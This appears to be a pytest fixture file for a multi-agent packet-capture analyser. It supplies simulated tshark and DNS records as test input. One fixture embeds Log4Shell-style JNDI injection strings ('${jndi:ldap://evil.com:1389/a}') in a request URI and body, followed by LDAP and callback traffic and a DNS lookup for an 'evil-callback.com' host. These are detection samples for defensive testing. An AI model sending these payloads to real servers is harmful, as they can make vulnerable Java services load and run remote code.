import os
import sys
import json
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.environ["SPLUNK_PASS"] = "test-pass"
os.environ["SPLUNK_HOST"] = "https://splunk-test:8089"
os.environ["PCAP_DIRECTORY"] = "/tmp"
os.environ["OLLAMA_HOST"] = "http://ollama-test:11434"

import multi_agent as ma


@pytest.fixture
def sample_tshark_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["1"],
                            "frame.time": ["Jul 26, 2026 12:00:00.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["192.168.1.1"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["2"],
                            "frame.time": ["Jul 26, 2026 12:00:01.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.2"], "ip.dst": ["10.0.0.3"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": [
                                "/?x=${jndi:ldap://evil.com:1389/a}"
                            ],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": ["${jndi:ldap://10.0.0.5:1389/exploit}"],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["3"],
                            "frame.time": ["Jul 26, 2026 12:00:02.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.4"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["LDAP"]},
                        "http": {},
                        "tcp": {"tcp.dstport": ["1389"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["4"],
                            "frame.time": ["Jul 26, 2026 12:00:03.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["8.8.8.8"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/cb"],
                            "http.user_agent": ["python-requests/2.31"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["5"],
                            "frame.time": ["Jul 26, 2026 12:00:04.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/normal"],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
        ]
    )


@pytest.fixture
def sample_dns_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["6"],
                            "frame.time": ["Jul 26, 2026 12:00:05.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["8.8.8.8"]},
                        "dns": {
                            "dns.qry.name": ["evil-callback.com"],
                            "dns.flags.response": ["0"],
                        },
                    }
                }
            }
        ]
    )
